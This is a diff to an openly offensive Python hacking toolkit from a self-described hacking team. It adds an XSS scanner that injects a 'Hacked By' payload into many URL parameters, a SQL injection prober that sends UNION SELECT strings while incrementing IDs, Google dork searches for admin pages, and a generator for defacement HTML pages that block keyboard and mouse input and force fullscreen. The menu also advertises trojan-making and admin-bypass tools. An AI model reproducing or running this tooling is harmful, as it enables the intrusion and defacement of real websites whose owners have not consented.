@@ -52,30 +52,30 @@ MAX_IPV4 = ipaddress.IPv4Address._ALL_ONES  # 2 ** 32 - 1
 MAX_IPV6 = ipaddress.IPv6Address._ALL_ONES  # 2 ** 128 - 1
 
 
-def random_ipv4():
+def randomipv4():
     return  ipaddress.IPv4Address._string_from_ip_int(
         random.randint(0, MAX_IPV4)
     )
 
-def random_ipv6():
+def randomipv6():
     return ipaddress.IPv6Address._string_from_ip_int(
         random.randint(0, MAX_IPV6)
     )
 random.seed(444)
-random_ipv4()
+randomipv4()
 '79.19.184.109'
-random_ipv4()
+randomipv4()
 '3.99.136.189'
-random_ipv4()
+randomipv4()
 '124.4.25.53'
-random_ipv6()
+randomipv6()
 '4fb7:270d:8ba9:c1ed:7124:317:e6be:81f2'
-random_ipv6()
+randomipv6()
 'fe02:b348:9465:dc65:6998:6627:1300:29c9'
-random_ipv6()
+randomipv6()
 '74a:dd88:1ff2:bfe3:1f3:81ad:debd:db88'    
-address = random_ipv4()
-ip6 = random_ipv6()
+address = randomipv4()
+ip6 = randomipv6()
 
 global user_agents
 user_agents = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
@@ -93,7 +93,8 @@ white = '\033[37m'
 green = '\033[1;32m'
 yellow = '\033[1;33m'
 blue = '\033[1;34m'
-
+red_t = '\033[0;31;40m'
+gray = '\033[1;37;40m'
 
 package_name = "adafruit"
 
@@ -156,7 +157,7 @@ print(f"""
                 ░░         ░   ▒      ░   ░ ░  ░ ░  ░ ░ ░ ░ ▒    ░░   ░   ░   ▒   
                  ░              ░  ░         ░    ░        ░ ░     ░           ░  ░                       
                                       \033[1;32mCoded By : MrSanZz
-                                           V : 3.1.2
+                                           V : 3.1.4
                                        Team:JogjaXploit
                                   \033[1;33mhttps://github.com/MrSanZz
 """)
@@ -1373,34 +1374,41 @@ elif answer == ("12"):
                     print('\n')
                     print('\033[1;34m+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(+AS+CHAR),0x7e))+FROM++LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)')    
     if ans.startswith("6"):
-        pass
-        print("Write Target : https://www.example.com/index.php so the tools just check the parameter")
-        site = input(f"Target Site : ")
-        time.sleep(0.5)
-        d = ['?id=', '?message=', '?page=', '?session=', '?about=', '?add=', '?page_cart=', '?cart=', '?list=', '?index=', '?add_new=', '?addTag=', '?addSite=', '?adm=', '?pass=', '?show_msg=', '?show=', '?api=', '?auth_user=', '?approved=', '?redirect=', '?html=', '?text=']
-        for y in d:
-            o = site + y
-            response = requests.get(o)
-            if response == True or response.status_code == 200:
-                pass
-                print(success + f"Ok Result")
-                print(f"{site}{y}")
-                print(info + f"Injecting With XSS...")
-                keyword = "Hacked By Someone"
-                xss = '<h1>Hacked+By+Someone</h1>'
-                xsr = str(f'{o}{xss}')
-                blue = '\033[1;34m'
-                print(success + xsr)
-                print(info + f"Checking...")
-                response = requests.get(xsr)
-                if response.status_code == 200:
-                    if re.search(keyword, response.text, re.IGNORECASE):
-                        print(success + f"\033[1;34mThe Site Has A Vuln.")
-                        print(blue + xsr)
+        try:
+            print("Write Target : https://www.example.com/index.php so the tools just check the parameter")
+            site = input(f"Target Site : ")
+            time.sleep(0.5)
+            d = ['?find=','?Find=' ,'?Cari=', '?cari=', '?id=', '?message=', '?page=', '?session=', '?about=', '?add=', '?page_cart=', '?cart=', '?list=', '?index=', '?add_new=', '?addTag=', '?addSite=', '?adm=', '?pass=', '?show_msg=', '?show=', '?api=', '?auth_user=', '?approved=', '?redirect=', '?html=', '?text=']
+            for y in d:
+                rand_user = random.choice(user_agents)
+                rand_ip = random.choice(randomipv4)
+                rand_ip6 = random.choice(randomipv6)
+                o = site + y
+                response = requests.get(o)
+                if response == True or response.status_code == 200:
+                    pass
+                    print(success + f"Ok Result")
+                    print(f"{site}{y}")
+                    print(info + f"Injecting With XSS...")
+                    keyword = "Hacked By Someone"
+                    xss = '"></a></span></p></input></form><h1>Hacked+By+Someone</h1>'
+                    xsr = str(f'{o}{xss}')
+                    blue = '\033[1;34m'
+                    print(success + xsr)
+                    print(info + f"Checking...")
+                    response = requests.get(xsr)
+                    if response.status_code == 200:
+                        if re.search(keyword, response.text, re.IGNORECASE):
+                            print(success + f"\033[1;34mThe Site Has A Vuln.")
+                            print(blue + xsr)
+                        else:
+                            print(fail + f"Site Has No Vuln Or Parameter")
                     else:
-                        print(fail + f"Site Has No Vuln Or Parameter")
-                else:
-                    print('')
+                        print('')
+        except requests.exceptions.SSLError:
+            pass
+            print(fail + f"SSL Error")
+        
 elif answer == ("13"):
     pass
     sites = input(f'\nSite : ')
@@ -2086,9 +2094,9 @@ elif answer == ("20"):
         os.system('cls')
     print(info + f'            [ ]Remember !, If The Tools Had A Error, Please Waiting For The Update.[ ]')
     print(f"""    {yellow}┌─────────────────────────────────────────────────────────────────────────────────────────────────┐{blue}
-    {yellow}│{blue} [01] WP Bypasser {red}[Hot Results]{blue}                                                                  {yellow}│{blue}
-    {yellow}│{blue} [02] Bypasser Admin V4 {red}[Hot Results]{blue}                                                            {yellow}│{blue}
-    {yellow}│{blue} [03] Deface SC Maker                                                                            {yellow}│{blue}
+    {yellow}│{blue} [01] WP Bypasser {red}[Hot Results]{blue}                     [11] Simple Pentest                          {yellow}│{blue}
+    {yellow}│{blue} [02] Bypasser Admin V4 {red}[Hot Results]{blue}               [12] Mass Dorks {red}[Ok Results]{blue}                 {yellow}│{blue}
+    {yellow}│{blue} [03] Deface SC Maker                               [13] {green}Deface Maker V2{blue}                         {yellow}│{blue}
     {yellow}│{blue} [04] Trojan Maker                                                                               {yellow}│{blue}
     {yellow}│{blue} [05] Bypasser Admin With ID {red}[Hot Results]{blue}                                                       {yellow}│{blue}
     {yellow}│{blue} [06] Leaker Tools V3 {red}[Hot Results]{blue}                                                              {yellow}│{blue}
@@ -2761,6 +2769,293 @@ elif answer == ("20"):
                     os.removedirs(site)
                 else:
                     exit()
+    elif answer == "11":
+        pass
+        if os.name == "posix":
+            os.system('clear')
+        elif os.name == "nt":
+            os.system('cls')
+        print("the target must have parameters !, [e.x : https://fuck.you/index.php?id=]")
+        i = input(green + f"Target URL : ")
+        en_int = int(input("Value : "))
+        while True:
+            try:
+                en_int +=1
+                result = str(f'{i}{en_int}')
+                print(info + f"[ + ] Checking URL with id {en_int} url : {result} [ + ]")
+                response = requests.get(result)
+                if response.status_code == 200:
+                    print(success + f'{response}')
+                    time.sleep(2)
+                else:
+                    print(fail + f"Code : ", response)
+                    time.sleep(2)
+                t = '),('.join(str(t) for t in range(1, en_int + 1))
+                result = f'({t})'
+                onion = (f'+AND+0+UNION(SELECT{result})')  
+                print('')
+                print(info + f"[ + ] Checking Url With : {onion}")
+                y = str(f'{i}{onion}')
+                print(y)
+                response = requests.get(y)
+                if response.status_code == 200:
+                    print(success + f'{response}')
+                    time.sleep(2)
+                else:
+                    print(fail + f'Code : ', response)
+                    time.sleep(2)
+                result = ', '.join(str(i) for i in range(1, en_int + 1))
+                onion = ('+AND+0+UNION+SELECT+')
+                print(info + f"[ + ] Checking target with : {onion}{result}")
+                t = str(f'{i}{onion}{result}')
+                print(t)
+                response = requests.get(t)
+                if response.status_code == 200:
+                    print(success + f'{response}')
+                    time.sleep(2)
+                else:
+                    print(fail + f'Code : ', response)
+                    time.sleep(2)
+            except KeyboardInterrupt:
+                print("Exit")
+                exit()
+    elif answer == "12":
+        pass
+        if os.name == "posix":
+            os.system('clear')
+        elif os.name == "nt":
+            os.system('cls')
+        print("""
+        ███╗   ███╗ █████╗ ███████╗███████╗    ██████╗  ██████╗ ██████╗ ██╗  ██╗███████╗
+        ████╗ ████║██╔══██╗██╔════╝██╔════╝    ██╔══██╗██╔═══██╗██╔══██╗██║ ██╔╝██╔════╝
+        ██╔████╔██║███████║███████╗███████╗    ██║  ██║██║   ██║██████╔╝█████╔╝ ███████╗
+        ██║╚██╔╝██║██╔══██║╚════██║╚════██║    ██║  ██║██║   ██║██╔══██╗██╔═██╗ ╚════██║
+        ██║ ╚═╝ ██║██║  ██║███████║███████║    ██████╔╝╚██████╔╝██║  ██║██║  ██╗███████║
+        ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝    ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
+        """)
+        try:
+            print(info + f"Example : dorks = inurl:/admin/dashboard.php inurl:/review.php?id= inurl:/admin-intext:welcome")
+            dork = input(blue + f"dorks = ")
+            e = dork.split()
+            dorks = e
+            
+            for i in dorks:
+                print(info + f"[ + ] Searching : {i} [ + ]")
+                for results in search(f'{i}', num=int(1), start=0, stop=None, pause=2):
+                    print(success + results)
+        except urllib.error.HTTPError as e:
+            if e.code == 429:
+                print(fail + f"[!] 429 Error [!]")
+        except KeyboardInterrupt:
+            print(green + f"Interrupt Detected")
+            exit()
+    elif answer == "13":
+        pass
+        if os.name == "posix":
+            os.system('clear')
+        elif os.name == "nt":
+            os.system('cls')
+        print(f"{red_t}██████{gray}╗ {red_t}██████{gray}╗  {red_t}██████{gray}╗       {red_t}██████{gray}╗ {red_t}███████{gray}╗{red_t}███████{gray}╗ {red_t}█████{gray}╗  {red_t}██████{gray}╗{red_t}███████{gray}╗")
+        print(f"{red_t}██{gray}╔══{red_t}██{gray}╗{red_t}██{gray}╔══{red_t}██{gray}╗{red_t}██{gray}╔═══{red_t}██{gray}╗      {red_t}██{gray}╔══{red_t}██{gray}╗{red_t}██{gray}╔════╝{red_t}██{gray}╔════╝{red_t}██{gray}╔══{red_t}██{gray}╗{red_t}██{gray}╔════╝{red_t}██{gray}╔════╝")
+        print(f"{red_t}██████{gray}╔╝{red_t}██████{gray}╔╝{red_t}██{gray}║   {red_t}██{gray}║{red_t}█████{gray}╗{red_t}██{gray}║  {red_t}██{gray}║{red_t}█████{gray}╗  {red_t}█████{gray}╗  {red_t}███████{gray}║{red_t}██{gray}║{red_t}     {red_t}█████{gray}╗")
+        print(f"{red_t}██{gray}╔═══╝ {red_t}██{gray}╔══{red_t}██{gray}╗{red_t}██{gray}║   {red_t}██{gray}║{gray}╚════╝{red_t}██{gray}║  {red_t}██{gray}║{red_t}██{gray}╔══╝  {red_t}██{gray}╔══╝  {red_t}██{gray}╔══{red_t}██{gray}║{red_t}██{gray}║     {red_t}██{gray}╔══╝")
+        print(f"{red_t}██{gray}║     {red_t}██{gray}║  {red_t}██{gray}║╚{red_t}██████{gray}╔╝      {red_t}██████{gray}╔╝{red_t}███████{gray}╗{red_t}██{gray}║     {red_t}██{gray}║  {red_t}██{gray}║╚{red_t}██████{gray}╗{red_t}███████{gray}╗")
+        print(f"{gray}╚═╝     ╚═╝  ╚═╝ ╚═════╝       ╚═════╝ ╚══════╝╚═╝     ╚═╝  ╚═╝ ╚═════╝╚══════╝{white}")
+        # 6 Deface SC
+        print(f"{red_t}╔═══════════════════════════════════════╗")
+        print(f"{red_t}╟ {gray}1. Deface 1{red_t}                           ║")
+        print(f"{red_t}╟ {gray}2. Deface 2{red_t}                           ║")
+        print(f"{red_t}╟ {gray}3. Deface 3{red_t}                           ║")
+        print(f"{red_t}╟ {gray}4. Deface 4{red_t}                           ║")
+        print(f"{red_t}╟ {gray}5. Deface 5{red_t}                           ║")
+        print(f"{red_t}╟ {gray}6. Deface 6{red_t}                           ║")
+        print(f"{red_t}╚═══════════════════════════════════════╝")
+        choice = input(f"Choice : ")
+        if choice == "1":
+            pass
+            name = input(info + f"Attacker name : ")
+            team = input(info + f"Team name : ")
+            msg = input(info + f"Message : ")
+            file_name = input(info + f"Save as [e.x : sanzz]: ")
+            grts = input(f"Greetz : ")
+            e = input(info + f"Photo / Logo [Skip for default icon]: ")
+            if e:
+                logo = e
+            else:
+                logs = ['https://media.tenor.com/glpSwjTJQJEAAAAi/furina-genshin-impact.gif']
+                logo = random.choice(logs)
+            sc1 = f"""
+            <font color="white">
+            <head>
+                <title>HackedBy{name}</title>
+                <table width="100%" height="90%">
+                <tbody><tr><td align="center">
+            <br><br>
+            <br><br><font color="white">
+            <i>
+
+            <script type="text/javascript">
+            alert("Hacked By: {name}");
+            </script>
+
+            <meta charset="utf-8">
+            <link rel="preconnect" href="https://fonts.gstatic.com">
+            <link href="https://fonts.googleapis.com/css2?family=Archivo+Black&display=swap" rel="stylesheet">
+            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
+            """
+            sc2 = "{font-family:Courier}img{opacity:80%}red{color:red}#background-video{height:100vh;width:100vw;object-fit:cover;position:fixed;left:0;right:0;top:0;bottom:0;z-index:-1}font{text-shadow:#000 0 0 3px;-webkit-font-smoothing:antialiased}div{animation:glitch 1s linear infinite}@keyframes glitch{2%,64%{transform:translate(2px,0) skew(0)}4%,60%{transform:translate(-2px,0) skew(0)}62%{transform:translate(0,0) skew(5deg)}}div:after,div:before{content:attr(title);position:absolute;left:0}div:before{animation:glitchTop 1s linear infinite;clip-path:polygon(0 0,100% 0,100% 33%,0 33%);-webkit-clip-path:polygon(0 0,100% 0,100% 33%,0 33%)}@keyframes glitchTop{2%,64%{transform:translate(2px,-2px)}4%,60%{transform:translate(-2px,2px)}62%{transform:translate(13px,-1px) skew(-13deg)}}div:after{animation:glitchBotom 1.5s linear infinite;clip-path:polygon(0 67%,100% 67%,100% 100%,0 100%);-webkit-clip-path:polygon(0 67%,100% 67%,100% 100%,0 100%)}@keyframes glitchBotom{2%,64%{transform:translate(-2px,0)}4%,60%{transform:translate(-2px,0)}62%{transform:translate(-22px,5px) skew(21deg)}}"
+            sc3 = """{var e=document.documentElement;e.requestFullscreen?e.requestFullscreen():e.msRequestFullscreen?e.msRequestFullscreen():e.mozRequestFullScreen?e.mozRequestFullScreen():e.webkitRequestFullscreen&&e.webkitRequestFullscreen(),document.getElementById("body").style.cursor="http://cur.cursors-4u.net/symbols/sym-1/sym46.cur",document.onkeydown=function(e){return!1},document.addEventListener("keydown",e=>{"F11"==e.key&&e.preventDefault()})}"""
+            r = "{return"
+            i = "}"
+            ueh = "{"
+            oke = """;!function e(t){void 0===n[t]&&setTimeout(function(){e(0)},3e4),t<n[t].length&&function e(t,n,o){n<t.length?(document.getElementById("hekerabies").innerHTML=t.substring(0,n+1),setTimeout(function(){e(t,n+1,o)},150)):"function"==typeof o&&setTimeout(o,7e3)}(n[t],0,function(){e(t+1)})}(0)}"""
+            rr = f"""["{msg}"]{oke}"""
+            sc4 = f"{ueh}var n={rr}"
+            sc5 = f"""
+            <body bgcolor="black" text="white" oncontextmenu="return!1" onkeydown="return!1" onmousedown="return!1" onclick="document.getElementById(&quot;lagu&quot;).play(),fs()" id="body" onload="typeWriter()" data-new-gr-c-s-check-loaded="14.1097.0" data-gr-ext-installed=""><style type="text/css">center{sc2}</style><script language="JavaScript">function confirmExit(){r}"are you sure ? wkwk"{i}function fs(){sc3}window.onbeforeunload=confirmExit;</script><script id="rendered-js">document.addEventListener("DOMContentLoaded",function(e){sc4})</script><audio src="https://kosred.com/a/gavwen.mp3" autoplay="true" id="lagu" loop=""></audio><video id="background-video" src="https://kosred.com/a/oanknh.mp4" autoplay="" loop="" muted="" style="position:fixed;object-fit:cover" poster="data:image/png;base64, iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII="><source src="hehe.mp4" type="video/webm"></video><table width="100%" height="80%"><tbody><tr><td><center><small>We ARE <red>{team}</red></small><br><img src="{logo}" width="220" height="220" Loading="Lazy" onerror="this.style.display=&quot;none&quot;"><font size="5"><br>Hacked by<red><i> {name}</i></red></font><br><font size="2" id="hekerabies">Oh No! The Security Has Been Hacked!</font><br><br><small><font size="1" color="gray">From {name}</font></small><div class="footer-greetings"><marquee><font size="2"><b>Greetz</b>: {grts}</font></marquee></div></center></td></tr></tbody></table><script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script></body><br>
+            </div>
+            </font>
+            </body>
+            </p>
+            </span>
+            """
+            sc = sc1 + sc5
+            def logging(file_name):
+                try:
+                    time.sleep(0.5)
+                    file = open((file_name) + ".html", "a")
+                    file.write(str(sc))
+                    file.close()
+                    file_name = file_name
+                    print(success + f"Success make file {file_name}")
+                except FileExistsError:
+                    print(f"File {file_name} Already Exists !")
+            logging(file_name)
+        elif choice == "2":
+            pass
+            name = input(info + f"Attacker name : ")
+            team = input(info + f"Team name : ")
+            msg = input(info + f"Message : ")
+            file_name = input(info + f"Save as [e.x : sanzz]: ")
+            grts = input(f"Greetz : ")
+            e = input(info + f"Photo / Logo [Skip for default icon]: ")
+            if e:
+                logo = e
+            else:
+                logs = ['https://media.tenor.com/glpSwjTJQJEAAAAi/furina-genshin-impact.gif']
+                logo = random.choice(logs)
+            sc1 = f"""
+            <head>
+                <title>HackedBy{name}</title>
+                <table width="100%" height="90%">
+            <tbody><tr><td align="center">
+
+            <meta charset="utf-8">
+            <link rel="preconnect" href="https://fonts.gstatic.com">
+            <link href="https://fonts.googleapis.com/css2?family=Archivo+Black&display=swap" rel="stylesheet">
+            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
+            """
+            idiot = """{font-family:Courier}img{opacity:80%}red{color:red}#background-video{height:100vh;width:100vw;object-fit:cover;position:fixed;left:0;right:0;top:0;bottom:0;z-index:-1}font{text-shadow:#000 0 0 3px;-webkit-font-smoothing:antialiased}div{animation:glitch 1s linear infinite}@keyframes glitch{2%,64%{transform:translate(2px,0) skew(0)}4%,60%{transform:translate(-2px,0) skew(0)}62%{transform:translate(0,0) skew(5deg)}}div:after,div:before{content:attr(title);position:absolute;left:0}div:before{animation:glitchTop 1s linear infinite;clip-path:polygon(0 0,100% 0,100% 33%,0 33%);-webkit-clip-path:polygon(0 0,100% 0,100% 33%,0 33%)}@keyframes glitchTop{2%,64%{transform:translate(2px,-2px)}4%,60%{transform:translate(-2px,2px)}62%{transform:translate(13px,-1px) skew(-13deg)}}div:after{animation:glitchBotom 1.5s linear infinite;clip-path:polygon(0 67%,100% 67%,100% 100%,0 100%);-webkit-clip-path:polygon(0 67%,100% 67%,100% 100%,0 100%)}@keyframes glitchBotom{2%,64%{transform:translate(-2px,0)}4%,60%{transform:translate(-2px,0)}62%{transform:translate(-22px,5px) skew(21deg)}}"""
+            i2 = """{var e=document.documentElement;e.requestFullscreen?e.requestFullscreen():e.msRequestFullscreen?e.msRequestFullscreen():e.mozRequestFullScreen?e.mozRequestFullScreen():e.webkitRequestFullscreen&&e.webkitRequestFullscreen(),document.getElementById("body").style.cursor="http://cur.cursors-4u.net/symbols/sym-1/sym46.cur",document.onkeydown=function(e){return!1},document.addEventListener("keydown",e=>{"F11"==e.key&&e.preventDefault()})}"""
+            ess = """{return"are you sure ? wkwk"}"""
+            wade = "{var n="
+            jogja = """{void 0===n[t]&&setTimeout(function(){e(0)},3e4),t<n[t].length&&function e(t,n,o){n<t.length?(document.getElementById("hekerabies").innerHTML=t.substring(0,n+1),setTimeout(function(){e(t,n+1,o)},150)):"function"==typeof o&&setTimeout(o,7e3)}(n[t],0,function(){e(t+1)})}(0)})"""
+            uh = f"""{ess}function fs(){i2}window.onbeforeunload=confirmExit;</script><script id="rendered-js">document.addEventListener("DOMContentLoaded",function(e){wade}["{msg}"];!function e(t){jogja}"""
+            sc2 = f"""
+            <body bgcolor="black" text="white" oncontextmenu="return!1" onkeydown="return!1" onmousedown="return!1" onclick="document.getElementById(&quot;lagu&quot;).play(),fs()" id="body" onload="typeWriter()" data-new-gr-c-s-check-loaded="14.1097.0" data-gr-ext-installed=""><style type="text/css">center{idiot}</style><script language="JavaScript">function confirmExit(){uh}</script>
+            <video id="background-video" src="https://kosred.com/a/rkylam.mp4" autoplay="" loop="" muted="" style="position:fixed;object-fit:cover" poster="data:image/png;base64, iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII="><source src="hehe.mp4" type="video/webm"></video><table width="100%" height="80%"><font size="5"><br>TEAM : {team}<br><img src="{logo}" style="width:300px; height:300px; border-width:0;"><br>Hacked by<red><i> {name}</i></red></font><br><font size="2" id="hekerabies">Oh No! The Security Has Been Hacked!</font><br><br><small><font size="1" color="gray">From {name}</font></small><div class="footer-greetings"><marquee><font size="2"><b>Greetz</b>: {grts}</font></marquee></div></center></td></tr></tbody></table><script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script></body><br>
+            <br>
+            <audio controls src="https://kosred.com/a/jsmuvk.mp3">
+            """
+            sc = sc1 + sc2
+            def logging(file_name):
+                try:
+                    time.sleep(0.5)
+                    file = open((file_name) + ".html", "a")
+                    file.write(str(sc))
+                    file.close()
+                    file_name = file_name
+                    print(success + f"Success make file {file_name}")
+                except FileExistsError:
+                    print(f"File {file_name} Already Exists !")
+            logging(file_name)
+        elif choice == "3":
+            pass
+            name = input(info + f"Attacker name : ")
+            team = input(info + f"Team name : ")
+            msg = input(info + f"Message : ")
+            file_name = input(info + f"Save as [e.x : sanzz]: ")
+            grts = input(f"Greetz : ")
+            music = input(f"Music URL : ")
+            e = input(info + f"Photo / Logo [Skip for default icon]: ")
+            if e:
+                logo = e
+            else:
+                logs = ['https://img.freepik.com/free-vector/cute-kitsune-with-sword-cartoon-character-art-object-isolated_138676-3159.jpg?size=338&ext=jpg&ga=GA1.1.1880011253.1700265600&semt=ais', 'https://m.media-amazon.com/images/I/414AP1U4afL.jpg', 'https://i.pinimg.com/736x/8c/fe/ed/8cfeed5fef181d8bb654f99ace2c2421.jpg', 'https://media.tenor.com/glpSwjTJQJEAAAAi/furina-genshin-impact.gif']
+                logo = random.choice(logs)
+            sc1 = f"""
+            <head>
+                <title>Hacked By {name}</title>
+            <meta name="viewport" content="width=device-width, initial-scale=1">
+            <meta charset="utf-8">
+            <link rel="preconnect" href="https://fonts.gstatic.com">
+            <link href="https://fonts.googleapis.com/css2?family=Archivo+Black&display=swap" rel="stylesheet">
+              <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
+            <table width="100%" height="90%">
+	          <tbody><tr><td align="center">
+            <br><br>
+            <br><br><font color="black">
+            <i>
+
+            <img src="{logo}" style="width:300px; height:300px; border-width:0;">
+            </a><br>
+
+            <title>Hacked By {name}</title>
+
+            <div class="typewriter">
+               <h1>Oh no! the security has been hacked!</h1>
+               <h1>We Are <font color="red">{team}</font></h1>
+            </div>
+            </font>
+
+            <b><br><font color="black"><font size="4">
+            "{msg}" <br><br>
+
+            <hacked>
+            <br>
+            <font size="3" color="red"> Greetz:</font><br>
+
+            [<font color="red">{grts}</span> ]
+            <body>
+            <br><br>
+
+            <audio autoplay="" controls src="{music}">
+            </audio>
+
+            </audio>
+            </body>
+            </html>
+
+            </head>
+            <body>
+
+            <body oncontextmenu="return false" onkeydown="return false" onmousedown="return false">
+            """
+            sc = sc1
+            def logging(file_name):
+                try:
+                    time.sleep(0.5)
+                    file = open((file_name) + ".html", "a")
+                    file.write(str(sc))
+                    file.close()
+                    file_name = file_name
+                    print(success + f"Success make file {file_name}")
+                except FileExistsError:
+                    print(f"File {file_name} Already Exists !")
+            logging(file_name)
+    else:
+        print(green + f"Exit..")
+        exit()
 else:
     print(green + f"Exit")
     exit()
